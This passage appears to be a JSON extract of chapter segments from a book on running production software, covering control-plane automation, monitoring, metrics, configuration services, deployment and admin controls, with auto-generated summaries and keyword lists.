what the “near misses” were. Did someone type an incorrect command but catch it before executing? That’s a near miss. Find out how they caught it. Find out what safety net could have helped them catch it or stop it from doing harm.\n\nAutomation Goes Really Fast\n\nAnother fascinating bit of information shows up in the AWS postmortem. “While removal of capacity is a key operational practice, in this instance, the tool used allowed too much capacity to be removed too quickly. We have modified this tool to remove capacity more slowly and added safeguards to prevent capacity from being removed when it will take any subsystem below its minimum required capacity level.”\n\nThis part stuck out because it closely resembled the outage that Reddit.com suffered in August 2016.2 After that outage, Reddit reported the event was pre- cipitated by its autoscaling service. It observed a partially migrated ZooKeeper database that claimed Reddit only needed a tiny fraction of the servers it was running. The autoscaler dutifully shut down the rest of the servers.\n\n2.\n\nwww.reddit.com/r/announcements/comments/4y0m56/why_reddit_was_down_on_aug_11\n\nreport erratum • discuss\n\nPlatform and Ecosystem • 197\n\nA common thread running through these outages is that the automation is not being used simply to enact the will of a human administrator. Rather, it is more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\n\nIn both cases, it’s totally normal to shut down an instance or two, maybe more. Most of the time, those individual VMs or processes don’t matter. One machine out of thousands is no big deal. But at some point, the automation shuts down enough machines to make a noticeable dent in capacity. The exact threshold depends on how much spare capacity you have for handling bursts. But once we’re talking about shutting down more than 50 percent of total server capacity, the automation probably ought to pause for some human confirmation that this is really the right course of action.\n\nAutomation has no judgment. When it goes wrong, it tends to do so really, really quickly. By the time a human perceives the problem, it’s a question of recovery rather than intervention. How can we allow human intervention without putting a human in the loop for everything? We should use automation for the things humans are bad at: repetitive tasks and fast response. We should use humans for the things automation is bad at: perceiving the whole situation at a higher level.\n\nWith that groundwork in place, let’s consider the major components of a control plane. In each area, we’ll look at the budget approach and the Cadillac approach (bearing in mind that the landscape changes quickly).\n\nPlatform and Ecosystem\n\nSuppose we decide to put monitoring into the platform. There’ll surely be a monitoring team within the platform team. Would we expect that team to respond to application alerts? Definitely not! Instead, that team should provide the capability that others then use. In other words, the monitoring team doesn’t do the monitoring, it provides the ability for others to do their own monitoring. This is a mental shift from ownership of the domain to offering a service to customers.\n\nSeems like an easy enough heuristic, but it leads immediately to a change in the way we view responsibilities. For example, it used to be common for the monitoring team to implement all the specific monitors, triggers, alerts, and thresholds. That puts them right in the middle of the change loop. It means they have to create a “request for monitoring” form for development teams to\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 198\n\nfill out (whether paper or online). It means that tweaks and changes to moni- toring have to go through a queue in the form of the other teams’ inboxes.\n\nIf we respect the customer-centric model, then the monitoring team should not implement the actual monitors. Team members should work one level removed: they implement the tools that let their customers implement their own monitors. In other words, the monitoring team may need to build infrastructure to receive alerts, deployment tools that push their monitoring agents out (if applicable), or scripting tools that let developers provide a JSON description of the monitors they need.\n\nThis begins to look like creating interfaces in an object-oriented application. The monitoring team offers up an interface that development teams can use. The details of implementation are owned by the monitoring team and can change as long as they continue to support their contract.\n\nWhat about database administrators? It’s a shame that the acronym DBA can mean both “database administrator” and “database architect.” The lines of responsibility have gotten blurred over the years. The administrator should ideally be concerned with creating a high-performance, stable platform on which development teams can build any kind of database. Sadly, technology constraints in days past led us to have DBAs that were responsible for both the health of the database server and the data model used by the applications. This caused a lot of tension when the data model was contorted to make the server happy instead of vice versa. A lot of the energy behind the NoSQL movement was really about refactoring those responsibilities.\n\nWith NoSQL and postrelational databases, we see a different split in the roles. The platform team includes database administrators who keep the database running and healthy. They ensure there’s enough capacity but the data model is up to the application.\n\nThe picture is harder with SQL-based RDBMSs. It’s too easy for one application to make a harmful schema change that affects other consumers. This leads us to decree a separate physical database for each service. It’s not very resource-efficient, but it does unfreeze development teams to move indepen- dently, without a queue for DBA attention.\n\nIs it possible to create a platform that allows safe, autonomous delivery into a shared SQL database? Yes, but it requires accommodation from both developers and DBAs. In particular, the difficulty of parsing SQL to do auto- mated sanity checking is too high. Developers and DBAs have to agree on a simpler, machine-readable format that can be scripted against. Many migration frameworks offer XML, JSON, or YAML formats that suffice.\n\nreport erratum • discuss\n\nDevelopment Is Production • 199\n\nKeep in mind that the goal for the platform team is to enable their customers. The team should be trying to take themselves out of the loop on every day- to-day process and focus on building safety and performance into the platform itself. If you find that your technology choices or architecture make this really difficult, it’s a good argument to change your technology!\n\nDevelopment Is Production\n\nQuick, think of a “dev server.” What comes to mind? Probably a barely running mess full of old temp files, tarballs named after people, scripts that aren’t in version control and nobody’s quite sure if they’re still used, SSH keys from developers who left years ago...in short, a big ramshackle mess.\n\nOkay, now think about your QA environment. Does it fully work? Does it really? Or are there a bunch of integrations stubbed out? Maybe there are jobs that run in production that can’t run in QA. Probably the database isn’t very realistic, because the production data has PII that can’t be copied around. Do you have high confidence that passing tests in QA means the software will work in production?\n\nMaybe you’re in the minority. If your image of a dev server is a fresh virtual machine with a known configuration, that’s great! Maybe your image of QA is a whole environment stamped out by the same automation tools that deploy to production, with an anonymized sample of production data from within the last week. If so, you’re doing quite well.\n\nMost organizations treat their development environments like a shantytown. Stuff only works there because the developers run their own power by daisy- chaining extension cords from a nearby settlement. QA doesn’t match produc- tion in topology or scale, and multiple dev teams are trying to get into QA but can’t because there’s only one environment. (Hint: There’s no “right number” of QA environments. Virtualize them so every team can create its own on- demand QA environment.) In short, development environments are treated with utter disregard.\n\nThis is kind of odd when you think about it, because developers are creating content all the time. They build software that has to go into version control (a service), get constructed in CI (another service), tested in QA (a service), and stored in a repository (yet another service). When these services are down, developers can’t do their jobs. Let’s look at an analogy. Suppose your compa- ny’s content management system went down so copywriters couldn’t do their jobs. That would be at least a Severity 2 outage, right?\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 200\n\nThe tools, services, and environments that developers need to do their jobs should be treated with production-level SLAs. The development platform is the production environment for the job of creating software.\n\nSystem-Wide Transparency\n\nBack in Transparency, on page 162, we saw how individual instances can reveal their state. That’s the start of a total story about transparency. Now we look at how to assemble a picture of system-wide health from the individ- ual instances’ information.\n\nThe first place to start is by defining what we need from our efforts. When dealing with the system as a whole, two fundamental questions need to be answered:\n\n1. Are users receiving a good experience?\n\n2.\n\nIs the system creating the economic value we want?\n\nNotice that the question, “Is everything running?” isn’t on that list. Even at small scale, we should be able to survive periods where everything isn’t running. At scale, “partially broken” is the normal state of operation. It’s rare to find all instances running with no deployments or failures at any given moment.\n\nReal-User Monitoring\n\nIt is hard to deduce whether users are receiving a good experience from indi- vidual instance metrics. (It would require a model of the whole system that accounts for circuit breakers, caches, fallbacks, and a pile of other implemen- tation details that change frequently.) Instead, the best way to tell if users are receiving a good experience is to measure it directly. This is known as real-user monitoring (or RUM, if you like).\n\nMobile and web apps can have instrumentation that reports their timing and failures up to a central service. That can take a lot of infrastructure, so you may consider a service such as New Relic or Datadog.3,4 If you are at a scale where it makes sense to run it yourself, on-premise software such as AppDy- namics or CA’s APM might be the thing for you.5,6 Some of these products also allow you to watch network traffic at the edge of your system, recording HTTP sessions for analysis or playback.\n\n3. 4. 5. 6.\n\nhttps://newrelic.com\n\nwww.datadoghq.com\n\nwww.appdynamics.com\n\nwww.ca.com/us/products/application-performance-monitoring.html\n\nreport erratum • discuss\n\nSystem-Wide Transparency • 201\n\nUsing these services has three advantages over the “DIY” approach. The first is rapid startup. You don’t need to build infrastructure or configure monitoring software. It is quite possible to get going with data collection in under an hour. Second, they offer agents and connectors for a wide array of technology, which makes it much easier to integrate all your monitoring into one place. Finally, their dashboards and visualization tend to be more polished than open-source alternatives.\n\nThere are downsides, of course. For one thing, these are commercial services. You’ll be paying a subscription fee. As your system scales, so will your fees. There may come a time when the fees become unpalatable, but the switching cost of moving to your own infrastructure is equally unpalatable. Second, some companies are absolutely unwilling to have even monitoring data crossing the Internet.\n\nOn-premise commercial solutions, such as AppDynamics, offer easy integration and polished visualization, but these lose the advantage of rapid startup and also have scaling fees.\n\nThe open-source arena has produced some excellent tools, but the usual open- source effect is at play: integrating the tools to your system can be a challenge. For that matter, integrating the tools with each other can be a challenge! The dashboards and visualization are also less polished and less user-friendly. While removing the very visible monthly fees for a service, the open source approach has less-visible costs in the form of labor and infrastructure.\n\nHalf of the vendors at operations or software architecture conferences are in this space, so the names may change by the time you read this. The broad category here is called “application performance management,” and it seems to be one of the last areas of operations software that hasn’t been replaced by open-source packages. As with other kinds of operations software, it’s not that important to choose the ideal solution. Instead, focus on adopting your chosen solution thoroughly. Don’t leave any “dead zones” in your system.\n\nReal-user monitoring is most useful to understand in terms of the current state and recent history. Dashboards and graphs are the most common ways to visualize this.\n\nEconomic Value\n\nSome software exists as art and some exists as entertainment. Most of the software we write for companies exists to create economic value. It may seem odd to be talking about the economics of software systems in a section about transparency, but this is where we can most directly perceive the linkage\n\nreport erratum • discuss",
      "page_number": 200,
      "chapter_number": 25,
      "summary": "Wrapping Up • 191\n\nWrapping Up\n\nWe looked at the interconnect layer in this chapter, where instances come together to form systems Key topics include operate, operations, and operating.",
      "keywords": [
        "Control Plane",
        "team",
        "monitoring team",
        "control",
        "n’t",
        "Plane",
        "monitoring",
        "control plane software",
        "report erratum",
        "software",
        "platform team",
        "production",
        "service",
        "database",
        "automation"
      ],
      "concepts": [
        "operate",
        "operations",
        "operating",
        "operators",
        "human",
        "automated",
        "automation",
        "database",
        "developers",
        "amazon"
      ],
      "similar_chapters": [
        {
          "book": "Microservice Architecture",
          "chapter": 9,
          "title": "Segment 9 (pages 66-73)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 45,
          "title": "Segment 45 (pages 456-462)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 27,
          "title": "Segment 27 (pages 257-266)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 43,
          "title": "Segment 43 (pages 433-447)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 44,
          "title": "Segment 44 (pages 448-455)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 26,
      "title": "Segment 26 (pages 208-215)",
      "start_page": 208,
      "end_page": 215,
      "detection_method": "topic_boundary",
      "content": "Chapter 10. Control Plane • 202\n\nbetween our systems and our financial success. The value created by our systems can be harmed if the user experience is bad. It can also be harmed if the system cost is too high. These are the “top line” and “bottom line” effects. We should build our transparency in terms of revealing the way that the recent past, current state, and future state connect to revenue and costs.\n\nThe top line is income. Revenue. The good stuff. Our system should be able to tell us if we’re making as much as we “should be” right now. In other words, are there performance bottlenecks that prevent us from signing up more new users? Is some crucial service returning errors that turn people off before they register? The specific needs here vary according to your domain, but you should plan to watch the following:\n\nWatch each step of a business process. Is there a rapid drop-off in some step? Is some service in a revenue-generating process throwing exceptions in logs? If so, it’s probably reducing your top line.\n\nWatch the depth of queues. Queue depth is your first indicator of perfor- mance degradation. A non-zero queue depth always means work takes longer to get through the process. For many business transactions, that queuing time directly hits your revenue.\n\nThe bottom line is net profit (or loss). It is the top line minus costs. Cost comes from infrastructure, especially in these days of autoscaled, elastic, pay-as- you-go services. Nearly every startup has a horror story about unchecked autoscaling costing them thousands of dollars due to unchecked demand. Worse yet, that sometimes results from runaway automation spinning up too many resources.\n\nCost also comes from operations. The harder your software is to operate, the more time it takes from people. That’s true whether you’re in a DevOps-style organization or a traditional siloed organization. Either way, any time spent responding to incidents is unplanned work that could have gone to raising the top line.\n\nAnother less visible source of cost comes from our platforms and runtimes. Some languages are very fast to code in but require more instances to handle a particular workload. You can improve the bottom line by moving crucial services to technology with a smaller footprint or faster processing. Before you do, though, make sure it’s a service that makes a difference. In other words, your feature that detects birds in photographs taken inside national parks may require a lot of CPU time; but if it only gets used once a month, it’s not material to your bottom line.\n\nreport erratum • discuss\n\nSystem-Wide Transparency • 203\n\nSo far we’ve talked about the current state and recent past. Our transparency tools should also help us consider the near future as well, such as these questions:\n\nAre there opportunities to increase the top line by improving performance\n\nor reducing queues?\n\nAre we going to hit a bottleneck that will prevent us from increasing the\n\ntop line?\n\nAre there opportunities to increase the bottom line by optimizing services?\n\nCan we see places that are overscaled?\n\nCan we replace slow-performing or large-footprint instances with more\n\nefficient ones?\n\nThe idea of monitoring, log collection, alerting, and dashboarding as being about economic value more than technical availability may be unfamiliar. Even so, if you adopt this perspective, you’ll find that it is easy to make decisions about what to monitor, how much data to collect, and how to rep- resent it.\n\nThe Risk of Fragmentation\n\nThe usual notion of perspectives splits into “technical” and “business” con- cerns. The “technical” perspective may even be split into “development” and “operations.” Most of the time, these constituencies look at different measure- ments collected by different means. Imagine the difficulty in planning when marketing uses tracking bugs on web pages, sales uses conversions reported in a business intelligence tool, operations analyzes log files in Splunk, and development uses blind hope and intuition. Could this crew ever agree on how the system is doing? It’d be much better to integrate the information so all parties can see the same data through similar interfaces.\n\nDifferent constituencies require different perspectives. These perspectives won’t all be served by the same views into the systems, but they should be served by the same information system overall. Just as the question, “How’s the weather?” means very different things to a gardener, a pilot, and a mete- orologist, the question, “How’s it going?” means something decidedly distinct when coming from the CEO or the system administrator. Likewise, a bunch of CPU utilization graphs won’t mean a lot to the marketing team. Each “special interest group” in your company may have its own favorite dashboard, but everyone should be able to see how releases affect user engagement or conversion rate affects latency.\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 204\n\nLogs and Stats\n\nIn Transparency, on page 162, we saw the importance of good logging and metrics generation at the microscopic scale. At the system scale, we need to gather all that data and make sense of it. This is the job of log and metrics collectors.\n\nLike a lot of these tools, log collectors can either work in push or pull mode. Push mode means the instance is pushing logs over the network, typically with the venerable syslog protocol.7 Push mode is quite helpful with containers, since they don’t have any long-lived identity and often have no local storage.\n\nWith a pull-mode tool, the collector runs on a central machine and reaches out to all known hosts to remote-copy the logs. In this mode, services just write their logs to local files.\n\nJust getting all the logs on one host is a minor achievement. The real beauty comes from indexing the logs. Then you can search them for patterns, make trendline graphs, and raise alerts when bad things happen. Splunk dominates the log indexing space today.8 The troika of Elasticsearch, Logstash, and Kibana is another popular implementation.\n\nThe story for metrics is much the same, except that the information isn’t always available in files. Some information can only be retrieved by running a program on the target machine to sample, say, network interface utilization and error rates. That’s why metrics collectors often come with additional tools to take measurements on the instances.\n\nMetrics also have the interesting property that you can aggregate them over time. Most of the metrics databases keep fine-grained measurements for very recent samples, but then they aggregate them to larger and larger spans as the samples get older. For example, the error rate on a NIC may be available second by second for today, in one-minute granularity for the past seven days, and only as hourly aggregates before that. This has two benefits. First, it really saves on disk space! Second, it also makes queries across very large time spans possible.\n\nWhat to Expose\n\nIf you could predict which metrics would limit capacity, reveal stability problems, or expose other cracks in the system, then you could monitor only those. But that prediction will have two problems. First, you’re likely to guess\n\n7. 8.\n\nhttps://tools.ietf.org/html/rfc5424\n\nwww.splunk.com\n\nreport erratum • discuss\n\nSystem-Wide Transparency • 205\n\nwrong. Second, even if you guess right, the key metrics change over time. Code changes and demand patterns change. The bottleneck that burns you next year probably doesn’t exist right now.\n\nOf course, you could spend an unlimited amount of effort exposing metrics for absolutely everything. Since your system still has to do something other than just collect data, I’ve found a few heuristics to help decide which variables or metrics to expose. Some of these will be available right away. For others, you might need to add code to collect the data in the first place. Here are some categories of things I’ve consistently found useful.\n\nTraffic indicators\n\nPage requests, page requests total, transaction counts, concurrent sessions\n\nBusiness transaction, for each type\n\nNumber processed, number aborted, dollar value, transaction aging, conversion rate, completion rate\n\nUsers\n\nDemographics or classification, technographics, percentage of users who are registered, number of users, usage patterns, errors encountered, successful logins, unsuccessful logins\n\nResource pool health\n\nEnabled state, total resources (as applied to connection pools, worker thread pools, and any other resource pools), resources checked out, high- water mark, number of resources created, number of resources destroyed, number of times checked out, number of threads blocked waiting for a resource, number of times a thread has blocked waiting\n\nDatabase connection health\n\nNumber of SQLExceptions thrown, number of queries, average response time to queries\n\nData consumption\n\nNumber of entities or rows present, footprint in memory and on disk\n\nIntegration point health\n\nState of circuit breaker, number of timeouts, number of requests, average response time, number of good responses, number of network errors, number of protocol errors, number of application errors, actual IP address of the remote endpoint, current number of concurrent requests, concurrent request high-water mark\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 206\n\nCache health\n\nItems in cache, memory used by cache, cache hit rate, items flushed by garbage collector, configured upper limit, time spent creating items\n\nAll of the counters have an implied time component. You should read them as if they all end with “in the last n minutes” or “since the last reset.”\n\nAs you can see, even a medium-sized system could have hundreds of metrics. Each one has some range in its normal and acceptable values. This might be a tolerance around a target value or a threshold that should not be crossed. The metric is “nominal” as long as it’s within that acceptable range. Often, a second range will indicate a “caution” signal, warning that the parameter is approaching a threshold.\n\nFor continuous metrics, a handy rule-of-thumb definition for nominal would be “the mean value for this time period plus or minus two standard deviations.” The choice of time period is where it gets interesting. Most metrics have a traffic-driven component, so the time period that shows the most stable cor- relation will be the “hour of the week”—that is, 2 p.m. on Tuesday. The day of the month means little. In certain industries—such as travel, floral, and sports—the most relevant measurement is counting backward from a holiday or event.\n\nFor a retailer, the “day of week” pattern will be overlaid on a strong “week of year” cycle. There is no one right answer for all organizations.\n\nConfiguration Services\n\nConfiguration services like ZooKeeper and etcd are distributed databases that applications can use to coordinate their configuration.9,10 Configuration in this sense is more than just the static parameters that an instance would keep in .properties files. It does include simple settings such as hostnames, resource pool sizes, and timeouts. But “configuration” also includes the arrangement of instances among themselves. These configuration databases can be used for orchestration, leader election (in the case of a cluster with a master node), or quorum-based consensus.\n\nHowever, these are built with code and not magic. They are still bound by the constraints of the CAP theorem and sub-light-speed communications. The configuration services are themselves distributed databases.\n\n9. https://zookeeper.apache.org 10. https://coreos.com/etcd/docs/latest\n\nreport erratum • discuss\n\nProvisioning and Deployment Services • 207\n\nThese services are scalable but not elastic. That means you can add and remove nodes, but response time will degrade as the nodes rebalance their data. It often requires an admin action to get the cluster to accept a new member or to indicate that an old member is gone for good.\n\nKeep in mind that the configuration service suffers the same network trauma that every other application does. There will be times that clients can’t reach the configuration service. Worse, there will be times when the nodes of the configuration service can’t reach each other but clients can reach the nodes. In this case, it has to be safe for the clients to run with slightly outdated configurations. Otherwise, you have no choice but to shut down applications when the configuration service is partitioned.\n\nInformation doesn’t only need to flow from the service to client instances, either. Instances can report back with their version numbers (or commit SHAs) and node identifiers. That means you can write a program or script to reconcile the actual state of the system with the expected state after a deployment. Be somewhat careful with this, as the configuration services can sustain high read volume but have to go through some consensus mechanism for every write. It’s OK to use these for relatively slowly changing configuration data, but they definitely don’t stand in for a log collection system.\n\nA few pointers about configuration services:\n\nMake sure your instances can start without the configuration service.\n\nMake sure your instances don’t stop working when configuration is\n\nunreachable.\n\nMake sure that a partitioned configuration node doesn’t have the ability\n\nto shut down the world.\n\nReplicate across geographic regions.\n\nProvisioning and Deployment Services\n\nIn Part III of this book, we look at how to design services and applications to be deployable. Here let’s look at the supporting infrastructure to perform the deployments themselves.\n\nDeployment may be the most well-trodden area of operations tools. It’s an obvious nexus between development and production. To some organizations, deployment is “DevOps.” It’s understandable. In many organizations deploy- ment is ridiculously painful, so it’s a good place to start making life better.\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 208\n\nConsequently, a host of deployment tools represent “push” and “pull” methods. A push-style tool uses SSH or another agent so a central server can reach out to run scripts on the target machines. The machines may not know their own roles. The server assigns them.\n\nIn contrast, pull-based deployment tools rely more on the machines to know their own roles. Software on the machine reaches out to a configuration service to grab the latest bits for its role.\n\nPull-based tools work especially well with elastic scaling. Elastically scaled virtual machines or containers have ephemeral identities, so there’s no point in having a push-based tool maintain a mapping from machine identity to role—the machine identity will shortly disappear, never to be seen again! With long-lived virtual machines or even physical hosts, push-based tools can be simpler to set up and administer. That’s because they use commodity software like SSH rather than agents that require their own configuration and authentication techniques.\n\nThe deployment tool by itself should be augmented with a package repository. Whether that’s an official “artifact repository” tool or an S3 bucket is up to you. But it’s important to have a location for blessed binary bits that isn’t populated from a developer’s laptop. Production builds need to be run on a clean build server using libraries with known provenance. The build pipeline should tag the build as it passes various stages, especially verification steps like unit or integration tests.\n\nThis isn’t just being pedantic or jumping through hoops to satisfy a security department. Repeatable builds are important so code that works on your machine works in production, too.\n\nBuild Server as Attack Vector\n\nAny widely used piece of server software will be used for an attack. That includes build servers such as Jenkins, Bamboo, or GoCD.\n\nAt least one major software vendor was attacked by means of the build environment. The attacker compromised a plugin to the vendor’s continuous integration server. The plugin injected code that targeted a well-known customer of this vendor (relayed in personal communication to the author). This vendor kept its libraries in a controlled artifact repository but had overlooked the plugins to the build system itself. Those were downloaded directly from the Net.\n\nreport erratum • discuss\n\nCommand and Control • 209\n\nCanary deployments are an important job of the build tooling. The “canary” is a small set of instances that get the new build first. For a period of time, the instances running the new build coexist with instances running the old build. (See Chapter 14, Handling Versions, on page 263, to enable peaceful coexistence.) If the canary instances behave oddly, or their metrics go south, then the build is not rolled out to the remaining population.\n\nLike every other stage of build and deployment, the purpose of the canary deployment is to reject a bad build before it reaches the users.\n\nAt a larger scale, the deployment tool needs to interact with another service to decide on placement. That placement service will determine how many instances of a service to run. It should be network-aware so it can place instances across network regions for availability. Typically, it’ll also drive the interconnect layer to set up IP addresses, VLANs, load balancers, and firewall rules.\n\nWhen you get to this scale, it’s probably time to look at the platform players. We’ll cover those a bit later in The Platform Players, on page 212. Even though a dedicated team will sustain and operate the platform, you’ll want to learn what it can do. That’s because your software needs to include a description of its needs and wants for the platform to provide (usually as a JSON or YAML file in the build artifacts.)\n\nCommand and Control\n\nLive control is only necessary if it takes your instances a long time to be ready to run. As a thought experiment, imagine that any configuration change took ten milliseconds to roll out and that each instance could be restarted in another hundred milliseconds. In that world, live control would be more trouble than it was worth. Whenever an instance needed to be modified, it would be simpler to just kill the instance and let the scheduler start a new one.\n\nIf your instances run in containers and get their configuration from a config- uration service, then that is exactly the world you live in. Containers start very quickly. New configuration would be used immediately.\n\nSadly, not every service is made of instances that start up so quickly. Anything based on Oracle’s JVM (or OpenJDK for that matter) needs a “warm-up” period before the JIT really kicks in and makes it fast. Many services need to hold a lot of data in cache before they perform well enough. That also adds to the startup time. If the underlying infrastructure uses virtual machines instead of containers, then it can take several minutes to restart.\n\nreport erratum • discuss",
      "page_number": 208,
      "chapter_number": 26,
      "summary": "This chapter covers segment 26 (pages 208-215). Key topics include number, services, and timing.",
      "keywords": [
        "services",
        "system",
        "Number",
        "Configuration Services",
        "time",
        "Configuration",
        "n’t",
        "metrics",
        "Transparency",
        "line",
        "top line",
        "report erratum",
        "state",
        "instances",
        "software"
      ],
      "concepts": [
        "number",
        "services",
        "timing",
        "time",
        "users",
        "makes",
        "making",
        "configure",
        "configured",
        "configurations"
      ],
      "similar_chapters": [
        {
          "book": "Microservices Up and Running",
          "chapter": 9,
          "title": "Segment 9 (pages 86-94)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 281-289)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 309-318)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 8,
          "title": "Segment 8 (pages 57-67)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 27,
      "title": "Segment 27 (pages 216-223)",
      "start_page": 216,
      "end_page": 223,
      "detection_method": "topic_boundary",
      "content": "Chapter 10. Control Plane • 210\n\nControls to Offer\n\nIn those cases, you need to look at ways to send control signals to running instances. Here is a brief checklist of controls to plan for:\n\nReset circuit breakers. • Adjust connection pool sizes and timeouts. • Disable specific outbound integrations. • Reload configuration. • Start or stop accepting load. • Feature toggles.\n\nNot every service will need all of these controls. They should give you a place to start, though.\n\nMany services also expose controls to update the database schema, or even to delete all data and reseed it. These are presumably helpful in test environ- ments but extremely hazardous in production. These controls result from a breakdown in roles. Developers don’t trust operations to deploy the software and run the scripts correctly. Operations doesn’t allow developers to log in to the production machines to update the schemata. That breakdown is itself a problem to fix. Don’t build a self-destruct button into your production code!\n\nAnother common control is the “flush cache” button. This is also quite haz- ardous. It may not be a self-destruct button, but it’s the button that vents all your atmosphere into space. An instance that flushes a cache will have really bad performance for the next several minutes. It may also generate a dogpile on the underlying service or database. Some kinds of services just can’t respond until their working set is loaded into memory.\n\nSending Commands\n\nOnce you’ve decided which controls to expose, there’s still the question of how to convey the operator’s intention out to the instances themselves. The simplest approach is to offer an admin API over HTTP. Each instance of a service would listen on a port for these requests. It needs to be a different port than ordinary traffic, however. The admin API should not be available to the general public!\n\nAn HTTP API leaves the door open for higher levels of automation in the future. In the beginning, it’s fine to use cURL or any other HTTP client to poke the admin API. If that API happens to be described in Open API format,11 then a GUI comes for free with Swagger UI.12\n\n11. www.openapis.org 12. http://swagger.io/swagger-ui\n\nreport erratum • discuss\n\nCommand and Control • 211\n\nAt larger scales, simple scripts to call the admin API may no longer suffice. For one thing, it takes time to make the API call to each instance. Suppose each API call takes just a quarter-second to complete. It will take two minutes to loop over a fleet of 500 instances. Actually, that assumes all the instances are up and responding properly. More likely, whatever script loops over those API calls will stall out partway through because some instance doesn’t respond.\n\nThat’s when it’s time to build a “command queue.” This is a shared message queue or pub/sub bus that all the instances can listen to. The admin tool sends out a command that the instances then perform.\n\nBe careful, though! With a command queue, it’s even easier to create a dogpile. It’s often a good idea to have each instance add a random bit of delay to spread them out a bit. It can also help to identify “waves” or “gangs” of instances. So a command may target “wave 1,” followed by “wave 2” and “wave 3” a few minutes later.\n\nScriptable Interfaces\n\nAdmin GUIs demo very well. Unfortunately, they are a nightmare in produc- tion. The chief problem with a GUI is all the clicking. Mice are not easily scriptable—operators have to resort to GUI testing tools like Watir or Robo- Forms to automate them. GUIs slow down operations by forcing administrators to do the same manual process on each service or instance (there might be many) every time the process is needed. For example, the clean shutdown sequence on a particular order management system I worked on required clicking—and waiting several minutes—on each of six different servers. Guess how often the clean shutdown sequence was observed? With a one-hour change window, nobody can afford to spend half of it waiting on the GUI.\n\nThe net result is that GUIs make terrible administrative interfaces for long- term production operation. The best interface for long-term operation is the command line. Given a command line, operators can easily build a scaffolding of scripts, logging, and automated actions to keep your software happy.\n\nRemember This\n\nIt’s easy to get excited about control plane software. Blog posts and Hacker News will always egg you on to build more. But always keep the operating costs in mind. Anything you build must either be maintained or torn down. Choose the options that are appropriate for your team size and the scale of your workload.\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 212\n\nStart with visibility. Use logging, tracing, and metrics to create transparency. Collect and index logs to look for general patterns. That also gets logs off of the machines for postmortem analysis when a machine or instance fails.\n\nUse configuration, provisioning, and deployment services to gain leverage over larger or more dynamic systems. The more you move toward ephemeral machines, the more you need these. This pipeline to production is not just a set of development tools. It is the production environment that developers use to produce value. Treat it with the same care as you would any other production environment.\n\nOnce the system is (somewhat) stabilized and problems are visible, build control mechanisms. These should give you more precise control than just reconfiguring and restarting instances. A large system deployed to long-lived machines benefits more from control mechanisms than a highly dynamic environment will.\n\nThe Platform Players\n\nSo far, the solutions we’ve seen need “some assembly required.” That means you can adopt them incrementally and defer commitment. Optionality comes at a cost, though, because you’ll end up devoting time and resources plumbing together different parts. For example, a basic yet frustrating aspect of rolling your own platform is getting all the authentication and role-based authorization systems working together. Another common stumbling block is integrating the components’ monitoring to provide a unified view.\n\nAt the other end of the integration spectrum, we have the platform players. The platform is to the data center what the operating system is to the personal computer. It abstracts the underlying infrastructure and presents a friendlier programming model. It manages resources and schedules tasks, just across multiple computers. A platform offers assurance that its parts will all work together coherently.\n\nThe population of platform players persistently permutes. At the time of writing, the top contenders are Google’s Kubernetes,13 Apache’s Mesos,14 CloudFoundry,15 and Docker’s “Swarm Mode.”16 The odds are good that one or more new players will arrive before this book hits print.\n\n13. https://kubernetes.io 14. http://mesos.apache.org 15. www.cloudfoundry.org 16. https://docs.docker.com/engine/swarm\n\nreport erratum • discuss\n\nThe Shopping List • 213\n\nA distinguishing feature of the platforms versus the cloud providers is about location. With the platforms, the software is available to be installed at any location: on your premises, in a hosting facility, or on top of a public cloud.\n\nIt’s relatively easy for one team in a large organization to deploy its own monitoring framework. That’s not the case with the platforms. They require care and feeding in their own right. It is more likely that a big group within an organization will move to one of the prefab platforms. That also means that individual teams probably don’t have the capacity or authority to build their own platforms. (It wouldn’t be cost-efficient anyway, because you need to amortize the support cost across a larger number of teams to justify it.)\n\nWhen these platforms work well, it can be an amazingly smooth experience to deploy services. A single command can bundle up a JAR file or Python project with its runtime, build a virtual machine or container image, run it, and set up DNS for you.\n\nIf you are adopting one of these platforms, you should really embrace it. There’s no point in using one at arm’s length. Don’t try to wrap the API or provide your own set of scripts. You’re investing a lot in the platform, so get the most you can out of it!\n\nThe Shopping List\n\nThis chapter gradually introduced many moving parts, so here’s a checklist of the things you might need. Remember that not every organization needs everything on this list. Apply a cost/benefit trade-off view toward each.\n\nLog collection and search • Metrics collection and visualization • Deployment • Configuration service • Instance placement • Instance and system visualization • Scheduling • IP, overlay network, firewall, and route management • Autoscaler • Alerting and notification\n\nWrapping Up\n\nEvery solution creates new problems. As our systems have scaled up and out, we’ve virtualized everything. Workload runs across containers and VMs, one\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 214\n\nor more clouds, and physical data centers. Just keeping tabs on this far-flung network requires new tools and techniques.\n\nWe’ve looked at the ways we can create visibility across whole systems so we can answer two fundamental questions: Are users receiving a good experience? And is the system producing the economic value we want? To answer those, we need to collect information across instances and services. We need tracing tools to understand where bottlenecks, inhibitors, and points of failure exist.\n\nOnce we know what’s happening across the system, we 